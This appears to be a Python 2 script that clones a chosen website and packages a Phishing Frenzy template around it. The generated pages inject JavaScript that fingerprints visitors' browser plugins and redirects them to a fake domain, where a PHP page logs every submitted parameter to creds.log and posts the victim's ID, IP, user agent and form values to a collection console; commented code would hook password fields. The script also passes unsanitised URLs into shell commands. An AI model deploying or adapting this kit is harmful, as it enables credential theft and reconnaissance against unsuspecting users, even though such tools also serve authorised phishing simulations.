import re,sys,argparse, commands, tempfile
try:
    from bs4 import BeautifulSoup
except ImportError:
    from BeautifulSoup import BeautifulSoup

import zipfile
tempDir = tempfile.gettempdir() 
    
def generateZIP():
	zipFilename = "template.zip"
	print '- Creating archive'	    
	zf = zipfile.ZipFile(zipFilename, mode='w')
	try:
		zf.write(tempDir+'/PluginDetect_AllPlugins.js')
		zf.write(tempDir+'/attachments.yml')
		zf.write(tempDir+'/template.yml')
		zf.write(tempDir+'/include1.js')
		zf.write(tempDir+'/index.php')
		zf.write(tempDir+'/index2.php')
	finally:
		zf.close()
	print "- Generated zip file: "+zipFilename
	print "- You can now import the file in Phishing Frenzy under Templates > Restore"
	

def generateTemplate(url):
	attachmentsText = """---

- !ruby/object:Attachment
  attributes:
   id: 61
   file: include1.js
   attachable_id: 16
   attachable_type: Template
   created_at: 2014-09-05 18:03:50.000000000 Z
   updated_at: 2014-09-05 18:03:50.000000000 Z
   function: website
- !ruby/object:Attachment
  attributes:
   id: 62
   file: PluginDetect_AllPlugins.js
   attachable_id: 16
   attachable_type: Template
   created_at: 2014-09-05 18:03:50.000000000 Z
   updated_at: 2014-09-05 18:03:50.000000000 Z
   function: website
- !ruby/object:Attachment
  attributes:
   id: 63
   file: index.php
   attachable_id: 16
   attachable_type: Template
   created_at: 2014-09-05 18:03:50.000000000 Z
   updated_at: 2014-09-05 18:03:50.000000000 Z
   function: website
- !ruby/object:Attachment
  attributes:
   id: 64
   file: index2.php
   attachable_id: 16
   attachable_type: Template
   created_at: 2014-09-05 18:03:50.000000000 Z
   updated_at: 2014-09-05 18:03:50.000000000 Z
   function: website"""	
   
	templateText = """--- !ruby/object:Template
attributes:
  id: 16
  campaign_id: 
  name: Template1
  description: '[template_name]'
  location: 
  notes: 'ZIP archive contains a readme.  You will want to customize the template
	to match your organization.  The readme will show you exactly where to make changes. '
  created_at: 2014-09-05 17:55:23.000000000 Z
  updated_at: 2014-09-05 18:03:50.000000000 Z
  directory_index: index.php"""	
	templateText = templateText.replace("[template_name]",url)
	
	print "- Generated attachments.yml and template.yml"
	target = open(tempDir+"/attachments.yml", 'w')
	target.write(attachmentsText)
	target.close()

	target = open(tempDir+"/template.yml", 'w')
	target.write(templateText)
	target.close()

def runCommand(fullCmd):
    try:
    	return commands.getoutput(fullCmd)
    except:
        return "Error executing command %s" %(fullCmd)
        
def cloneWebsite(url):
	print "- Cloning website: "+url
	cmd = 'wget --no-check-certificate -O '+tempDir+'/data.html -c -k -U "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36" '+url
	runCommand(cmd)
	
def generateFiles(domainName,pfURL):
	cmd = "wget http://www.pinlady.net/PluginDetect/scripts/PluginDetect_AllPlugins.js -O "+tempDir+"/PluginDetect_AllPlugins.js"
	runCommand(cmd)

	includeJScode = """
 PluginDetect.getVersion("."); 
 var total="";
 var version = PluginDetect.getVersion("Flash"); 
 if(version!=null){
 total+=("flash="+version)
 }
 var version = PluginDetect.getVersion("DevalVR"); 
 if(version!=null){
 total+=("|DevalVR="+version)
 }
 var version = PluginDetect.getVersion("Shockwave"); 
 if(version!=null){
 total+=("|Shockwave="+version)
 }
 var version = PluginDetect.getVersion("WindowsMediaPlayer"); 
 if(version!=null){
 total+=("|WindowsMediaPlayer="+version)
 }
 var version = PluginDetect.getVersion("Silverlight"); 
 if(version!=null){
 total+=("|Silverlight="+version)
 }
 var version = PluginDetect.getVersion("vlc"); 
 if(version!=null){
 total+=("|vlc="+version)
 }
 var version = PluginDetect.getVersion("AdobeReader"); 
 if(version!=null){
 total+=("|AdobeReader="+version)
 }
 var version = PluginDetect.getVersion("QuickTime"); 
 if(version!=null){
 total+=("|QuickTime="+version)
 }
 var version = PluginDetect.getVersion("RealPlayer"); 
 if(version!=null){
 total+=("|RealPlayer="+version)
 }
 var version = PluginDetect.getVersion("Java"); 
 if(version!=null){
 total+=("|Java="+version)
 }
function getSearchParameters() {
		var prmstr = window.location.search.substr(1);
		return prmstr != null && prmstr != "" ? transformToAssocArray(prmstr) : {};
}
function transformToAssocArray( prmstr ) {
		var params = {};
		var prmarr = prmstr.split("&");
		for ( var i = 0; i < prmarr.length; i++) {
			var tmparr = prmarr[i].split("=");
			params[tmparr[0]] = tmparr[1];
		}
		return params;
}
var params = getSearchParameters();
var uid = params.uid;
var ip = "<?php echo $ip; ?>";

$.get("http://ipinfo.io", function(response) {
	var ip = response.ip;
	base64total=(total);
	base64total+="&uid="+uid+"&ip="+ip;
	window.location='http://[fakedomain]/index2.php?'+base64total;
}, "jsonp");	
	"""

	indexcode = """
<?php
	$html = file_get_contents('data.html');
	echo $html;
	echo '<script type="text/javascript" src="http://[fakedomain]/PluginDetect_AllPlugins.js"></script>';
	echo '<script type="text/javascript" src="http://[fakedomain]/include1.js"></script>';
?>
</body></html>
	"""

	index2code = """
<?php
		$html = file_get_contents('data.html');
		echo $html;

		$file = 'creds.log';
		file_put_contents($file, print_r($_GET, true), FILE_APPEND);
	function clean($string) {
		$string = str_replace(' ', '-', $string); // Replaces all spaces with hyphens.
		return preg_replace('/[^A-Za-z0-9\-=&]\|/', '', $string); // Removes special chars.
	}

	function get_ip() {
		if (function_exists('apache_request_headers')) {
		  $headers = apache_request_headers();
		} else {
		  $headers = $_SERVER;
		}
		if (array_key_exists('X-Forwarded-For',$headers) && filter_var($headers['X-Forwarded-For'],FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {
		  $the_ip = $headers['X-Forwarded-For'];
		} elseif (array_key_exists('HTTP_X_FORWARDED_FOR',$headers) && filter_var($headers['HTTP_X_FORWARDED_FOR'],FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
		  $the_ip = $headers['HTTP_X_FORWARDED_FOR'];
		} else {
		  $the_ip = filter_var($_SERVER['REMOTE_ADDR'],FILTER_VALIDATE_IP,FILTER_FLAG_IPV4);
		}
		return $the_ip;
	  }

	$uid = $_GET['uid'];
	$ip = $_GET['ip'];

	$str1 = '';

	foreach ($_GET as $param_name => $param_val) {
		if (($param_name != "uid") and ($param_name != "ip")){
			$str1 = $str1 . $param_name . '=' . $param_val . '|';
		}
	}

	$formValues = rtrim($str1,'|');
	$formValues = clean($formValues);

	$browser = $_SERVER['HTTP_USER_AGENT'];
	$host = $_SERVER['HTTP_HOST'];
	$url = "http://[phishing-frenzy-url]" . '/reports/results/';

	$data = array('uid' => $uid, 'browser_info' => $browser, 'ip_address' => $ip, 'extra' => "$formValues");
	$options = array(
		'http' => array(
		'header'  => 'Content-type: application/x-www-form-urlencoded',
		'method'  => 'POST',
		'content' => http_build_query($data),
		),
	);
	$context  = stream_context_create($options);
	$result = file_get_contents($url, false, $context);

?>	
	"""

	includeJScode = includeJScode.replace("[fakedomain]",domainName)
	indexcode = indexcode.replace("[fakedomain]",domainName)

	index2code = index2code.replace("[fakedomain]",domainName)
	index2code = index2code.replace("[phishing-frenzy-url]",pfURL)
	index2code = index2code.replace("[redirect_url]",url)


	insertJS="<?php $uid = $_GET['uid'];?>"

	fname=tempDir+"/data.html"
	with open(fname) as f:
		content = f.readlines()

	#origHtml=""
	#for x in content:
	#	x = x.strip()
	#	origHtml+=x

	#origHtml1=str(BeautifulSoup(origHtml))
	#origTag = ""
	#replaceTag = ""

	#soup = BeautifulSoup(origHtml)
	#forms = soup.findAll('form')
	#for x in forms:
	#	inputs = x.find_all('input')	
	#	for y in inputs:
	#		if 'type="password"' in str(y) or "type='password'" in str(y):	
	#			origTag = str(y)
	#			replaceTag = str(y)+'<input id="uid" name="uid" type="hidden" value="<?php echo $uid;?>"/>'

	#origHtml2 = origHtml1.replace(origTag,replaceTag)
	#origHtml2 = re.sub('action="*"', 'action="http://%s/index2.php"' % (domainName), origHtml2)

	#Generate files
	
	target = open(tempDir+'/include1.js', 'w')
	target.write(includeJScode)
	target.close()
	
	target = open(tempDir+'/index.php', 'w')
	target.write(indexcode)
	target.close()

	target = open(tempDir+"/index2.php", 'w')
	target.write(index2code)
	target.close()
	print "- Generated data.html, index.php and index2.php"
	
if __name__ == '__main__':
    global filename
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', action='store', help='[URL of website to clone]')
    parser.add_argument('-i', action='store', help='[Domain name where this cloned web will be hosted on]')
    parser.add_argument('-u', action='store', help='[URL of phishing frenzy console]')
	
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    if options.i and options.u and options.c:
		url = options.c
		cloneWebsite(url)
			
		domainName = options.i
		pfURL = options.u
		generateFiles(domainName,pfURL)
		generateTemplate(url)
		generateZIP()
    else:
        print "- You must supply -c, -i and -u arguments"
